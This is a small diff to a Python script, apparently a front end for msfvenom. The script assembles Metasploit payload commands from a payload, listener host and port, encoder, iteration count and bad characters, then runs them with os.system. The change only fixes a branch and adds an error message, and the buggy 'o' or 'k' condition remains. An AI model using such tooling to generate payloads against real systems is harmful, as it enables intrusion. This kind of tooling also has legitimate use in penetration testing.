@@ -208,9 +208,11 @@ try:
                 print("Executing... " + str(msfcode))
                 os.system(str(msfcode))
                 break
-            if file == "o" or "k":
+            elif file == "o" or "k":
                 print("msfvenom -p " + str(payload) + " lhost=" + str(lhost) + " lport=" + str(lport) + " -e " + str(encoder) + " -i " + str(iteration) + " -b " + str(badchar) + " " + str(x) + " " + str(template) + "." + suffix)
                 os.system("msfvenom -p " + str(payload) + " lhost=" + str(lhost) + " lport=" + str(lport) + " -e " + str(encoder) + " -i " + str(iteration) + " -b " + str(badchar) + " " + str(x) + " " + str(template) + "." + suffix)
+            else:
+                print("Wrong input, try again!")
                 break
 
         elif outcmd == "s":
